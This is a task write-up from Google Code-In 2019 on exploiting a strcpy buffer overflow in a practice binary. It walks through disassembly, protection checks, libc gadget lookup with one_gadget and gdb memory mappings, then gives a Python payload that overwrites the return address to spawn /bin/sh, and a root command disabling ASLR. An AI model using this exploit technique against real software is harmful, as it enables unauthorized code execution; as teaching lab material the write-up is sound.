# Exploiting a buffer overflow vulnerability
## Google Code-In 2019 Task Write-Up
### We' ve got [executable](http://nishantparhi.me/gci/exploitme), we need to obtain root shell using it.

## Let' s put it into GDB and disassemble it.
```asm
   0x0000000008001145 <+0>:     push   rbp
   0x0000000008001146 <+1>:     mov    rbp,rsp
   0x0000000008001149 <+4>:     sub    rsp,0x110
   0x0000000008001150 <+11>:    mov    DWORD PTR [rbp-0x104],edi
   0x0000000008001156 <+17>:    mov    QWORD PTR [rbp-0x110],rsi
   0x000000000800115d <+24>:    mov    rax,QWORD PTR [rbp-0x110]
   0x0000000008001164 <+31>:    add    rax,0x8
   0x0000000008001168 <+35>:    mov    rdx,QWORD PTR [rax]
   0x000000000800116b <+38>:    lea    rax,[rbp-0x100]
   0x0000000008001172 <+45>:    mov    rsi,rdx
   0x0000000008001175 <+48>:    mov    rdi,rax
   0x0000000008001178 <+51>:    call   0x8001030 <strcpy@plt>
   0x000000000800117d <+56>:    lea    rax,[rbp-0x100]
   0x0000000008001184 <+63>:    mov    rdi,rax
   0x0000000008001187 <+66>:    call   0x8001040 <puts@plt>
   0x000000000800118c <+71>:    mov    eax,0x0
   0x0000000008001191 <+76>:    leave
   0x0000000008001192 <+77>:    ret
```

## Let' s decompile it using ghidra and decorate the code a little bit
```c
int main(int argc, char** argv) {
    char buffer[256];
    strcpy(buffer, argv[1]);
    puts(buffer);
    return 0;
}
```

## Okay, I have 256 bytes buffer. Can I just put a nopslide + shellcode and then redirect execution flow to it?
Unfortunetly no, I can' t. It' s compiled with ```NX Flag``` enabled, so stack is not executable. **¯\_(ツ)_/¯**
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./exploitme
```

## What about redirecting execution flow directly into ```execve()``` function in libc?
Let' s try. Check for ```execve()``` gadget with [one_gadget](https://github.com/david942j/one_gadget) tool. 
```
one_gadget /lib/x86_64-linux-gnu/libc-2.28.so
0x4484f execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x448a3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe5456 execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
```
Okay, I have got three gadgets with ```execve("/bin/sh")```, let' s go back to gdb and try using them.

I need to get direct memory address of this gadget, so let' s check ```libc``` offset in memory.
```
(gdb) info proc mappings
process 810
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
           0x8000000          0x8001000     0x1000        0x0 /mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability/exploitme
           0x8001000          0x8002000     0x1000     0x1000 /mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability/exploitme
           0x8002000          0x8003000     0x1000     0x2000 /mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability/exploitme
           0x8003000          0x8004000     0x1000     0x2000 /mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability/exploitme
           0x8004000          0x8005000     0x1000     0x3000 /mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability/exploitme
           0x8005000          0x8026000    0x21000        0x0 [heap]
      0x7fffff5e0000     0x7fffff602000    0x22000        0x0 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff602000     0x7fffff617000    0x15000    0x22000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff617000     0x7fffff618000     0x1000    0x37000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff618000     0x7fffff74a000   0x132000    0x38000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff74a000     0x7fffff796000    0x4c000   0x16a000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff796000     0x7fffff797000     0x1000   0x1b6000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff797000     0x7fffff79b000     0x4000   0x1b6000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff79b000     0x7fffff79d000     0x2000   0x1ba000 /lib/x86_64-linux-gnu/libc-2.28.so
      0x7fffff79d000     0x7fffff7a1000     0x4000        0x0
      0x7fffff7b0000     0x7fffff7b2000     0x2000        0x0
      0x7fffff7c0000     0x7fffff7c1000     0x1000        0x0 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7c1000     0x7fffff7cf000     0xe000     0x1000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7cf000     0x7fffff7d0000     0x1000     0xf000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7d0000     0x7fffff7de000     0xe000    0x10000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7de000     0x7fffff7df000     0x1000    0x1e000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7df000     0x7fffff7e6000     0x7000    0x1f000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7e6000     0x7fffff7e7000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7e7000     0x7fffff7e8000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7e8000     0x7fffff7e9000     0x1000    0x27000 /lib/x86_64-linux-gnu/ld-2.28.so
      0x7fffff7e9000     0x7fffff7ea000     0x1000        0x0
      0x7fffff7ef000     0x7ffffffef000   0x800000        0x0 [stack]
      0x7ffffffef000     0x7fffffff0000     0x1000        0x0 [vdso]
```
Okay, the place where libc starts is ```0x7fffff5e0000```.
Let' s start writing some exploit:
```py
#!/bin/env python
import struct
padding = '\x41'*(256+8) # overwrite buffer and rbp register]
execve = struct.pack('q', 0x7fffff5e0000+0x4484f)

print padding + execve
```

It' s time to execute this:
```
(gdb) run $(python2.7 gen_payload.py)
Starting program: /mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability/exploitme $(python2.7 gen_payload.py)
/bin/bash: warning: command substitution: ignored null byte in input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOHb
process 863 is executing new program: /bin/dash
$ whoami
[Detaching after fork from child process 868]
synnek
```
## Yaay, we got a shell. What about running it outside of debugger?
```
synnek@synnek-windows:/mnt/d/dev/gci-2019/exploiting-a-buffer-overflow-vulnerability$ ./exploitme $(python2.7 gen_payload.py)
bash: warning: command substitution: ignored null byte in input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOHb
$ whoami
synnek
$
```
It works, but sometimes you need to disable ASLR with:
```
echo 0 > /proc/sys/kernel/randomize_va_space
```
as root of course.

## Made by Emilian `synnek1337` Zawrotny